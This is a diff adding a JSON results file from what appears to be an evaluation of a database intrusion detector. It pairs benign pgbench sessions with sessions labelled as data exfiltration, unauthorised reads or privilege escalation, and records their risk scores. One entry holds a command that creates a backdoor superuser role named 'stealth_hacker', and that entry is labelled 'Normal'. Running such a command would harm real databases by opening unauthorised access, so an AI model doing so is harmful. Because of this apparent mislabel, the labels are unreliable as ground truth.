+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110484",
+            "filename": "enriched_session_110484_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5737,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5737,
+          "margin_widened": 0.5737,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100084",
+            "filename": "enriched_session_100084_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110485",
+            "filename": "enriched_session_110485_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5516,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5516,
+          "margin_widened": 0.5516,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100085",
+            "filename": "enriched_session_100085_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "110486",
+            "filename": "enriched_session_110486_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5503,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5503,
+          "margin_widened": 0.5503,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100087",
+            "filename": "enriched_session_100087_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111478",
+            "filename": "enriched_session_111478_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5496,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5496,
+          "margin_widened": 0.5496,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100088",
+            "filename": "enriched_session_100088_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111480",
+            "filename": "enriched_session_111480_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5502,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5502,
+          "margin_widened": 0.5502,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100090",
+            "filename": "enriched_session_100090_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111481",
+            "filename": "enriched_session_111481_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5495,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5495,
+          "margin_widened": 0.5495,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100093",
+            "filename": "enriched_session_100093_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111497",
+            "filename": "enriched_session_111497_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.551,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.551,
+          "margin_widened": 0.551,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100094",
+            "filename": "enriched_session_100094_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111498",
+            "filename": "enriched_session_111498_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5501,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5501,
+          "margin_widened": 0.5501,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100097",
+            "filename": "enriched_session_100097_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "111499",
+            "filename": "enriched_session_111499_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5545,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5545,
+          "margin_widened": 0.5545,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100100",
+            "filename": "enriched_session_100100_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113510",
+            "filename": "enriched_session_113510_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5495,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5495,
+          "margin_widened": 0.5495,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100101",
+            "filename": "enriched_session_100101_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113512",
+            "filename": "enriched_session_113512_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5494,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5494,
+          "margin_widened": 0.5494,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100102",
+            "filename": "enriched_session_100102_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113513",
+            "filename": "enriched_session_113513_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5596,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5596,
+          "margin_widened": 0.5596,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100103",
+            "filename": "enriched_session_100103_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113529",
+            "filename": "enriched_session_113529_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5514,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5514,
+          "margin_widened": 0.5514,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100104",
+            "filename": "enriched_session_100104_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113530",
+            "filename": "enriched_session_113530_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5569,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5569,
+          "margin_widened": 0.5569,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100105",
+            "filename": "enriched_session_100105_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "113531",
+            "filename": "enriched_session_113531_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5509,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5509,
+          "margin_widened": 0.5509,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100106",
+            "filename": "enriched_session_100106_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115533",
+            "filename": "enriched_session_115533_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5494,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5494,
+          "margin_widened": 0.5494,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100108",
+            "filename": "enriched_session_100108_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115536",
+            "filename": "enriched_session_115536_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5482,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5482,
+          "margin_widened": 0.5482,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100109",
+            "filename": "enriched_session_100109_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115537",
+            "filename": "enriched_session_115537_Data_Exfiltration.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 1000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5492,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5492,
+          "margin_widened": 0.5492,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100110",
+            "filename": "enriched_session_100110_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115551",
+            "filename": "enriched_session_115551_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.551,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.551,
+          "margin_widened": 0.551,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100112",
+            "filename": "enriched_session_100112_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115553",
+            "filename": "enriched_session_115553_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5511,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5511,
+          "margin_widened": 0.5511,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Sensitive_Access",
+          "benign": {
+            "session_id": "100116",
+            "filename": "enriched_session_100116_Normal.graphml",
+            "query": "BEGIN;",
+            "tables": [
+              "('Table', 'pgbench_tellers')",
+              "('Table', 'pgbench_accounts')",
+              "('Table', 'pgbench_branches')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "115554",
+            "filename": "enriched_session_115554_Unauthorized_DB_Read.graphml",
+            "query": "SELECT aid, abalance FROM pgbench_accounts ORDER BY abalance DESC LIMIT 5000;",
+            "tables": [
+              "('Table', 'pgbench_accounts')"
+            ],
+            "proc_count": 0,
+            "file_count": 0,
+            "endpoint_count": 0,
+            "os_risk": 0.5384,
+            "os_status": "benign",
+            "cross_risk": 0.5509,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 1.0,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0,
+          "cross_margin": 0.5509,
+          "margin_widened": 0.5509,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        }
+      ]
+    },
+    "Network_File": {
+      "pair_count": 30,
+      "avg_os_cosine_similarity": 1.0,
+      "avg_file_jaccard_similarity": 0.6083,
+      "avg_os_margin": 0.0407,
+      "avg_cross_layer_margin": 0.4435,
+      "os_discrimination_accuracy": 0.0667,
+      "cross_layer_discrimination_accuracy": 0.3,
+      "all_evaluations": [
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "100170",
+            "filename": "enriched_session_100170_Normal.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 21,
+            "endpoint_count": 0,
+            "os_risk": 0.5577,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "93024",
+            "filename": "enriched_session_93024_Data_Exfiltration.graphml",
+            "query": "VACUUM FULL pgbench_accounts;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 21,
+            "endpoint_count": 0,
+            "os_risk": 0.544,
+            "os_status": "benign",
+            "cross_risk": 0.549,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.0244,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0137,
+          "cross_margin": 0.0,
+          "margin_widened": -0.0137,
+          "os_discriminated": false,
+          "cross_discriminated": false
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "100551",
+            "filename": "enriched_session_100551_Normal.graphml",
+            "query": "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';",
+            "tables": [
+              "('Table', 'pg_class')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.5683,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100706",
+            "filename": "enriched_session_100706_OS_Privilege_Escalation.graphml",
+            "query": "UPDATE pgbench_tellers SET tbalance = 99999 WHERE tid = 1;",
+            "tables": [
+              "('Table', 'pgbench_tellers')"
+            ],
+            "proc_count": 1,
+            "file_count": 13,
+            "endpoint_count": 0,
+            "os_risk": 0.556,
+            "os_status": "benign",
+            "cross_risk": 0.7042,
+            "cross_status": "alert",
+            "cross_rule": null
+          },
+          "similarity": {
+            "file_jaccard": 0.5294,
+            "proc_similarity": 1.0,
+            "feature_cosine_sim": 1.0
+          },
+          "os_margin": 0.0123,
+          "cross_margin": 0.7042,
+          "margin_widened": 0.6919,
+          "os_discriminated": false,
+          "cross_discriminated": true
+        },
+        {
+          "category": "Network_File",
+          "benign": {
+            "session_id": "100555",
+            "filename": "enriched_session_100555_Normal.graphml",
+            "query": "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
+            "os_risk": 0.6291,
+            "os_status": "benign",
+            "cross_risk": 0.0,
+            "cross_status": "benign",
+            "cross_rule": null
+          },
+          "malicious": {
+            "session_id": "100176",
+            "filename": "enriched_session_100176_Data_Exfiltration.graphml",
+            "query": "CREATE EXTENSION IF NOT EXISTS pgcrypto;",
+            "tables": [],
+            "proc_count": 1,
+            "file_count": 9,
+            "endpoint_count": 0,
